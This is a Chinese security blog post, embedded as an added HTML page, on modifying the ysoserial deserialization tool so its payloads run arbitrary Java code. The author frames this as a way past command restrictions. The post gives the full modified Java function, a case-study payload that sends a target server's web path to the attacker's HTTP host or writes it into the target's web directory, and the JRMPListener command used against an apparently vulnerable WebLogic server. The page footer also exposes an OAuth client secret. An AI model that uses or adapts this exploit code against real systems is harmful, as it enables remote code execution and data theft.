@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="修改ysoserial代码，可使其支持执行自定义代码，是在一次与Bearcat师傅聊天时提到的。当时觉得眼前一亮，感觉在命令执行受阻时，也许可以通过代码执行达到目的。后面去查资料找到了fnmsd师傅的文章，解决了实现该想法的疑问。在此感谢两位师傅给我的启发。">
+<meta name="keywords" content="网络安全,渗透测试,代码审计,漏洞艺术,漏洞挖掘,漏洞复现,漏洞利用,漏洞修复">
+<meta property="og:type" content="article">
+<meta property="og:title" content="使ysoserial支持执行自定义代码">
+<meta property="og:url" content="http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/index.html">
+<meta property="og:site_name" content="回忆飘如雪">
+<meta property="og:description" content="修改ysoserial代码，可使其支持执行自定义代码，是在一次与Bearcat师傅聊天时提到的。当时觉得眼前一亮，感觉在命令执行受阻时，也许可以通过代码执行达到目的。后面去查资料找到了fnmsd师傅的文章，解决了实现该想法的疑问。在此感谢两位师傅给我的启发。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/cmd-code.png">
+<meta property="og:image" content="http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/call.png">
+<meta property="og:image" content="http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/server_info.png">
+<meta property="og:image" content="http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/txt_info.png">
+<meta property="og:updated_time" content="2019-05-12T14:22:29.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="使ysoserial支持执行自定义代码">
+<meta name="twitter:description" content="修改ysoserial代码，可使其支持执行自定义代码，是在一次与Bearcat师傅聊天时提到的。当时觉得眼前一亮，感觉在命令执行受阻时，也许可以通过代码执行达到目的。后面去查资料找到了fnmsd师傅的文章，解决了实现该想法的疑问。在此感谢两位师傅给我的启发。">
+<meta name="twitter:image" content="http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/cmd-code.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>
+		
+			使ysoserial支持执行自定义代码 | 回忆飘如雪
+		
+	</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="https://github.com/c0ny1/">项目</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+         
+          <li><a href="/gossip">闲言碎语</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/articles/2019/quickly-find-jars-that-depend-on-poc-exp/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/articles/2019/oracle-download-auto-login-tampermonkey-script/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/&text=使ysoserial支持执行自定义代码"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/&title=使ysoserial支持执行自定义代码"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/&is_video=false&description=使ysoserial支持执行自定义代码"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=使ysoserial支持执行自定义代码&body=Check out this article: http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/&title=使ysoserial支持执行自定义代码"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/&title=使ysoserial支持执行自定义代码"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/&title=使ysoserial支持执行自定义代码"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/&title=使ysoserial支持执行自定义代码"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/&name=使ysoserial支持执行自定义代码&description=&lt;p&gt;修改ysoserial代码，可使其支持执行自定义代码，是在一次与Bearcat师傅聊天时提到的。当时觉得眼前一亮，感觉在命令执行受阻时，也许可以通过代码执行达到目的。后面去查资料找到了fnmsd师傅的文章，解决了实现该想法的疑问。在此感谢两位师傅给我的启发。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-意义"><span class="toc-number">1.</span> <span class="toc-text">0x01 意义</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-原理"><span class="toc-number">2.</span> <span class="toc-text">0x02 原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-编码"><span class="toc-number">3.</span> <span class="toc-text">0x03 编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-案例"><span class="toc-number">4.</span> <span class="toc-text">0x04 案例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-参考文章"><span class="toc-number">5.</span> <span class="toc-text">0x05 参考文章</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        使ysoserial支持执行自定义代码
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">c0ny1</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-05-09T21:00:41.000Z" itemprop="datePublished">2019-05-10</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/安全开发/">安全开发</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>修改ysoserial代码，可使其支持执行自定义代码，是在一次与Bearcat师傅聊天时提到的。当时觉得眼前一亮，感觉在命令执行受阻时，也许可以通过代码执行达到目的。后面去查资料找到了fnmsd师傅的文章，解决了实现该想法的疑问。在此感谢两位师傅给我的启发。</p>
+<a id="more"></a>
+
+<h2 id="0x01-意义"><a href="#0x01-意义" class="headerlink" title="0x01 意义"></a>0x01 意义</h2><p><strong>一、绕过检测，执行某些禁止命令。</strong></p>
+<p>有些系统做了防护，不许执行或者没有某些命令（比如wget）。这时可以编写命令同等功能的代码，来绕过限制。</p>
+<p><strong>二、解决各个平台命令不一致。</strong></p>
+<p>不同操作系统，命令会有不同。比如查看ip操作，Windows是ipconfig，Linux是ifconfg。而java代码是可以跨平台的。</p>
+<p><strong>三、获取更高的自由度，实现更复杂的操作。</strong></p>
+<p>命令的背后也是代码，当需要执行一些比较复杂的操作时，纯命令是很难实现的，但代码可以！</p>
+<h2 id="0x02-原理"><a href="#0x02-原理" class="headerlink" title="0x02 原理"></a>0x02 原理</h2><p>在<code>ysoserial/payloads/util/Gadgets.java</code>中的代码注释，作者提到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections（待做，可以做一些有趣的事情比如注入一个纯java的反弹或绑定shell去绕过较弱的保护）</span><br></pre></td></tr></table></figure>
+
+<p>可知作者也有此意，并给我们预留了可指定自定义代码的变量<code>cmd</code>。</p>
+<p><img src="/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/cmd-code.png" alt="作者的注释"></p>
+<p>我们从控制台传入的命令，会被保存到<code>command</code>变量中，最后ysoserial会将该变量的值,拼接到<code>&quot;Runtime.getRuntime.exec(&quot; + 命令 + &quot;)&quot;</code>中，生成形成达到命令执行的代码，所以本质上还是代码执行。</p>
+<p><strong>因此要想使ysoserial支持执行自定义代码，只要使得在控制台输入能控制cmd变量的值即可。实现起来并不难</strong></p>
+<h2 id="0x03-编码"><a href="#0x03-编码" class="headerlink" title="0x03 编码"></a>0x03 编码</h2><p>根据我个人的的需要，给ysoserial加入以下三种方式来指定要执行的自定义代码。</p>
+<table>
+<thead>
+<tr>
+<th align="center">序号</th>
+<th align="left">方式</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">1</td>
+<td align="left">“code:代码内容”</td>
+<td align="left">代码量比较少时采用</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="left">“codebase64:代码内容base64编码”</td>
+<td align="left">防止代码中存在但引号，双引号，&amp;等字符与控制台命令冲突。</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td align="left">“codefile:代码文件路径”</td>
+<td align="left">代码量比较多时采用</td>
+</tr>
+</tbody></table>
+<p><strong>注意：如果没有指定以上开头，就默认当命令处理。</strong></p>
+<p>基于上面的需求，我修改了<code>createTemplatesImpl()</code>函数的代码为如下，具体如何实现，请参考代码和注释。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> T templates = tplClass.newInstance();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use template gadget class</span></span><br><span class="line">    ClassPool pool = ClassPool.getDefault();</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload.class));</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(abstTranslet));</span><br><span class="line">    <span class="keyword">final</span> CtClass clazz = pool.get(StubTransletPayload.class.getName());</span><br><span class="line">    <span class="comment">// run command in static initializer</span></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="comment">// Code by c0ny1</span></span><br><span class="line">    <span class="comment">// email: root@gv7.me</span></span><br><span class="line">    <span class="comment">// date: 2019-04-29</span></span><br><span class="line">    <span class="comment">// From: https://www.cnblogs.com/0201zcr/p/5009975.html</span></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line">    String cmd = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span>(command.startsWith(<span class="string">"code:"</span>)) &#123;</span><br><span class="line">        cmd = command.substring(<span class="number">5</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(command.startsWith(<span class="string">"codebase64:"</span>))&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] decode = <span class="keyword">new</span> BASE64Decoder().decodeBuffer(command.substring(<span class="number">11</span>));</span><br><span class="line">        cmd = <span class="keyword">new</span> String(decode);</span><br><span class="line">        cmd = <span class="keyword">new</span> URLDecoder().decode(cmd);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(command.startsWith(<span class="string">"codefile:"</span>))&#123;</span><br><span class="line">        String codefile = command.substring(<span class="number">9</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            File file = <span class="keyword">new</span> File(codefile);</span><br><span class="line">            <span class="keyword">if</span>(file.exists())&#123;</span><br><span class="line">                FileReader reader = <span class="keyword">new</span> FileReader(file);</span><br><span class="line">                BufferedReader br = <span class="keyword">new</span> BufferedReader(reader);</span><br><span class="line">                StringBuffer sb = <span class="keyword">new</span> StringBuffer(<span class="string">""</span>);</span><br><span class="line">                String line = <span class="string">""</span>;</span><br><span class="line">                <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    sb.append(line);</span><br><span class="line">                    sb.append(<span class="string">"\r\n"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                cmd = sb.toString();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                System.err.println(String.format(<span class="string">"[-] %s is not exists!"</span>,codefile));</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">            command.replaceAll(<span class="string">"\\\\"</span>, <span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">            <span class="string">"\");"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    System.err.println(<span class="string">"----------------------------------Java code start----------------------------------"</span>);</span><br><span class="line">    System.err.println(cmd);</span><br><span class="line">    System.err.println(<span class="string">"-----------------------------------Java code end-----------------------------------"</span>);</span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">    <span class="comment">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span></span><br><span class="line">    clazz.setName(<span class="string">"ysoserial.Pwner"</span> + System.nanoTime());</span><br><span class="line">    CtClass superC = pool.get(abstTranslet.getName());</span><br><span class="line">    clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// inject class bytes into instance</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">"_bytecodes"</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;</span><br><span class="line">        classBytes, ClassFiles.classAsBytes(Foo.class)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// required to make TemplatesImpl happy</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"Pwnr"</span>);</span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">"_tfactory"</span>, transFactory.newInstance());</span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>修改完代码后，我们重新将其打包为ysoserial-0.0.6.1-custom-code-exec.jar，就可以使用可指定自定义代码的ysoserial了。需要我编译好的jar，请公众号后台回复“ysoserial可指定任意代码版本”获取。</p>
+<p>注意:只有以下payload支持指定支持任意代码执行，其他paylaod需要手工修改其代码，因为它们没有调用我们修改的<code>Gadgets.createTemplatesImpl</code>方法。</p>
+<p><img src="/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/call.png" alt="调用了createTemplatesImpl方法的payload"></p>
+<h2 id="0x04-案例"><a href="#0x04-案例" class="headerlink" title="0x04 案例"></a>0x04 案例</h2><p>下面举一个“不痛不痒”的例子，来展现其高自由度。</p>
+<p>假设我们有个需求是这样的，获取目标系统的web物理路径，如果目标能访问我们服务器就把信息提交到服务器的web服务上。如果不能，就把信息写到目标自己的web目录下。如果你使用命令在实现，是比较费劲的，但是用代码就轻而易举！</p>
+<p><strong>custiom-code.java</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">String HOST = <span class="string">"http://192.168.149.1:1665"</span>;</span><br><span class="line">String WEB_PATH = System.getProperty(<span class="string">"user.dir"</span>);</span><br><span class="line"></span><br><span class="line">String str_url = HOST + <span class="string">"/?info="</span> + WEB_PATH;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="comment">//若目标能访问我们的服务器，则发送信息到服务器上</span></span><br><span class="line">    java.net.URL url = <span class="keyword">new</span> java.net.URL(str_url);</span><br><span class="line">    java.net.URLConnection conn = url.openConnection();</span><br><span class="line">    conn.connect();</span><br><span class="line">    conn.getContent();</span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">    <span class="comment">//若目标不能访问我们的服务器，则将信息写到自己的web目录下info.log文件中</span></span><br><span class="line">    String webPath = WEB_PATH + <span class="string">"/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/info.log"</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        java.io.FileOutputStream f1 = <span class="keyword">new</span> java.io.FileOutputStream(webPath);</span><br><span class="line">        f1.write(WEB_PATH.getBytes());</span><br><span class="line">        f1.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e1) &#123;</span><br><span class="line">        e1.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里我利用CNVD-C-2019-48814这个漏洞，让远程服务器（192.168.149.142）加载我本机rmi服务（192.168.149.1:1664），我的rmi服务指定执行的代码，是我们编写好的custom-code.java。具体命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6.1-custom-code-exec.jar ysoserial.exploit.JRMPListener 1664 Jdk7u21 &quot;codefile:custom-code.java&quot;</span><br></pre></td></tr></table></figure>
+
+<p>通过测试发现，在本机启动web服务（92.168.149.1:1665），且目标可访问时，可成功接收信息。</p>
+<p><img src="/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/server_info.png" alt="服务器成功接收到信息"></p>
+<p>然后我把服务器web服务停止了，目标自然无法访问。结果在目标系统的web目录下成功生成了文件，保存着我们要采集的信息。</p>
+<p><img src="/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/txt_info.png" alt="目标web目录下成功生成包含信息的文件"></p>
+<p>从任意命令执行变成任意代码执行，在我看来危害增大了不少。在命令执行getshell受阻时，如何通过代码执行突破呢，到这里懂的人自然懂了。</p>
+<h2 id="0x05-参考文章"><a href="#0x05-参考文章" class="headerlink" title="0x05 参考文章"></a>0x05 参考文章</h2><ul>
+<li><a href="https://blog.csdn.net/fnmsd/article/details/79534877" target="_blank" rel="noopener">修改ysoserial使其支持生成代码执行Payload</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+
+
+
+    <link rel="stylesheet" href="https://unpkg.com/vssue/dist/vssue.min.css">
+<div id="vssue"></div>
+<script src="https://unpkg.com/vue/dist/vue.runtime.min.js"></script>
+<script src="https://unpkg.com/vssue/dist/vssue.github.min.js"></script>
+<!-- <script src="https://unpkg.com/vssue/dist/vssue.github-v4.min.js"></script> -->
+<script>
+    new Vue({
+      el: '#vssue',
+      render: h => h('Vssue', {
+        props: {
+          title: '使ysoserial支持执行自定义代码',
+          options: {
+            owner: 'ws4',
+            repo: 'ws4.github.io',
+            clientId: 'e47c5d37e969e470f60b',
+            clientSecret: '82b90182f62c79794f62979f6841b4199281b01d',
+          },
+        }
+      })
+    })
+</script>
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="https://github.com/c0ny1/">项目</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+         
+          <li><a href="/gossip">闲言碎语</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-意义"><span class="toc-number">1.</span> <span class="toc-text">0x01 意义</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-原理"><span class="toc-number">2.</span> <span class="toc-text">0x02 原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-编码"><span class="toc-number">3.</span> <span class="toc-text">0x03 编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-案例"><span class="toc-number">4.</span> <span class="toc-text">0x04 案例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-参考文章"><span class="toc-number">5.</span> <span class="toc-text">0x05 参考文章</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/&text=使ysoserial支持执行自定义代码"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/&title=使ysoserial支持执行自定义代码"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/&is_video=false&description=使ysoserial支持执行自定义代码"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=使ysoserial支持执行自定义代码&body=Check out this article: http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/&title=使ysoserial支持执行自定义代码"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/&title=使ysoserial支持执行自定义代码"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/&title=使ysoserial支持执行自定义代码"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/&title=使ysoserial支持执行自定义代码"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/&name=使ysoserial支持执行自定义代码&description=&lt;p&gt;修改ysoserial代码，可使其支持执行自定义代码，是在一次与Bearcat师傅聊天时提到的。当时觉得眼前一亮，感觉在命令执行受阻时，也许可以通过代码执行达到目的。后面去查资料找到了fnmsd师傅的文章，解决了实现该想法的疑问。在此感谢两位师傅给我的启发。&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2017 ~ 2019 c0ny1
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
